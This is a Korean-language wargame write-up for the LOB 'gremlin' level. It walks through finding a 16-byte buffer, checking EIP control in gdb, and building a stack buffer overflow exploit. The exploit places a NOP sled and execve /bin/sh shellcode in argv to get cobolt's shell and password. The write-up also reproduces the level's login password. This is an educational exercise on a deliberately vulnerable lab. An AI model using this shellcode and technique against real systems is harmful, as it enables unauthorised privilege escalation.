# LOB - gremlin

이전 문제인 gate에서 구한 gremlin과 PW인 hello bof world를 통해 들어간다.



ID : gremlin

PW : hello bof world

![1567942255396](https://user-images.githubusercontent.com/52530785/64917331-3ab7cb00-d7ca-11e9-96d1-1281cc815637.png)



파일 목록을 보면

![1567942344322](https://user-images.githubusercontent.com/52530785/64917332-3ab7cb00-d7ca-11e9-8e82-665200d96700.png)

cobolt와 cobolt의 소스가 들어있다.



```c
vi cobolt.c 를 통해 소스를 확인하면
```

![1567942384266](https://user-images.githubusercontent.com/52530785/64917333-3b506180-d7ca-11e9-8e0b-12e5fa730c4f.png)

gate와 전체적인 내용은 같지만 이번엔 buffer 크기가 16 byte이다.



```c
mkdir tmp
cp cobolt tmp/	명령어를 통해 일단 파일을 복사한다.
```



tmp 디렉터리에서

```c
buffer의 크기는 16 byte
SFP 크기는 4 byte이므로

./cobolt `python -c 'print "\x90"*20+"\x61\x61\x61\x61"'`
을 해주면 segmentation fault가 뜬다.
```

![1567943593663](https://user-images.githubusercontent.com/52530785/64917334-3b506180-d7ca-11e9-9dff-40f3575849d8.png))



```c
gdb -c core 명령어를 통해 들어가본다.
```

![1567943607752](https://user-images.githubusercontent.com/52530785/64917335-3b506180-d7ca-11e9-93be-aaae6ed42103.png)



RET 에 들어간

0x61616161 가 뭐냐고 물어보고 있다. -> eip에 들어가 있을 것이다.

![1567943650184](https://user-images.githubusercontent.com/52530785/64917336-3be8f800-d7ca-11e9-8d5b-b0619acf33ad.png)



일단 \x90 값이 어디에 들어갔는지 보기위해 

```c
x/100wx $esp+300	명령어를 사용한다.
```

![1567943764457](https://user-images.githubusercontent.com/52530785/64917337-3be8f800-d7ca-11e9-8118-659002d16c51.png)

위와 같이 \x90이 20개 들어가고, RET에 \x61616161 이 들어간 것을 볼 수 있다.



---

argv를 2개 주었다.

```c
./cobolt `python -c 'print "b"*20+"\x61\x61\x61\x61"'` `python -c 'print "\x90"*215+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

![1567947455469](https://user-images.githubusercontent.com/52530785/64917340-3be8f800-d7ca-11e9-9a4f-9b58a4a99805.png)



```c
gdb -c core	명령어를 통해 core를 확인한다.
```

![1567947401705](https://user-images.githubusercontent.com/52530785/64917339-3be8f800-d7ca-11e9-8efc-4304c84bf785.png)



RET가 0x61616161 이므로 저 주소가 뭔지 묻고 있다.

```c
x/100wx $esp+300	명령어를 통해 보면
```

![1567947803636](https://user-images.githubusercontent.com/52530785/64917341-3c818e80-d7ca-11e9-99de-6f9e0285b2dc.png)

argv 첫번째 인자가 나오고 Null 값이 들어간 후 두번째 인자가 들어간다.



두번째 인자에 쉘코드가 들어가 있으므로 첫번째 인자의 RET 부분에 두번째 인자 부분에서 쉘코드 앞에 있는 Nop 값이 있는 부분 주소를 적는다.

0xbffffbcc 를 선택했다.

```c
./cobolt `python -c 'print "b"*20+"\xcc\xfb\xff\xbf"'` `python -c 'print "\x90"*215+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```



위의 POC를 실행하면

![1567948049560](https://user-images.githubusercontent.com/52530785/64917342-3c818e80-d7ca-11e9-8601-663b784cf58e.png)

쉘이 뜬다.

하지만 이 파일은 tmp에 내가 복사한 파일이므로 gremlin 밖에 뜨지 않는다.



main 디렉터리로 돌아와서

POC를 실행하면

![1567948099912](https://user-images.githubusercontent.com/52530785/64917343-3c818e80-d7ca-11e9-893d-f7b07d6d1222.png)

cobolt의 권한이 들어오고,

my-pass를 통해 cobolt의 password를 얻을 수 있다.

